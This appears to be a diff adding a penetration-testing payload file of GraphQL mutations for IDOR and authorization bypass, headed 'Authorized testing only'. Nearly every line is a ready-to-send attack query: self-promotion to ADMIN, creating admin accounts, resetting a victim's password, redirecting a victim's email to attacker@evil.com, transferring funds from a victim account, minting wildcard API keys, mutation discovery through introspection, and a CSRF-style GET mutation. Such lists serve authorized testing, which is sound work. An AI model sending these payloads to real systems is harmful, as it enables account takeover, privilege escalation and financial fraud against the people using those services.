@@ -1,0 +1,37 @@
+# GraphQL mutation IDOR / authorization bypass patterns — introspection-driven
+# Authorized testing only.
+
+# --- Privilege escalation mutations ---
+{"query":"mutation { updateRole(userId: \"self-id\", role: ADMIN) { success } }"}
+{"query":"mutation { setAdmin(userId: \"victim-id\") { success } }"}
+{"query":"mutation { promoteUser(id: \"attacker-id\", role: \"administrator\") { id role } }"}
+
+# --- User lifecycle ---
+{"query":"mutation { deleteUser(id: \"admin-id\") { success } }"}
+{"query":"mutation { createAdminUser(email: \"attacker@evil.com\", password: \"P@ssw0rd!\") { id } }"}
+{"query":"mutation { register(email: \"attacker@evil.com\", role: ADMIN) { token } }"}
+
+# --- Password / account takeover ---
+{"query":"mutation { resetPassword(userId: \"victim-id\", newPassword: \"hacked123\") { success } }"}
+{"query":"mutation { changeEmail(userId: \"victim-id\", email: \"attacker@evil.com\") { success } }"}
+{"query":"mutation { updateUser(id: \"other-user-id\", input: { email: \"attacker@evil.com\" }) { id } }"}
+
+# --- Financial / order mutations ---
+{"query":"mutation { updateOrder(id: \"ORD-123\", status: REFUNDED) { id status } }"}
+{"query":"mutation { transfer(from: \"victim-account\", to: \"attacker-account\", amount: 10000) { success } }"}
+{"query":"mutation { applyCoupon(code: \"INTERNAL100\", orderId: \"any\") { discount } }"}
+
+# --- File / content mutations ---
+{"query":"mutation { uploadDocument(userId: \"other\", file: \"base64...\") { id url } }"}
+{"query":"mutation { publishPost(id: \"draft-id\", public: true) { id } }"}
+{"query":"mutation { deleteComment(id: \"not-mine\") { success } }"}
+
+# --- API key / token mutations ---
+{"query":"mutation { createApiKey(userId: \"admin-id\", scopes: [\"*\"]) { key } }"}
+{"query":"mutation { revokeSession(userId: \"admin-id\", sessionId: \"active\") { success } }"}
+
+# --- Hidden mutation discovery via __type ---
+{"query":"{ __type(name:\"Mutation\") { fields { name args { name type { name kind } } } } }"}
+
+# --- CSRF-vulnerable GET mutation (when server accepts GET) ---
+GET /graphql?query=mutation{updateEmail(email:"attacker@evil.com"){success}}
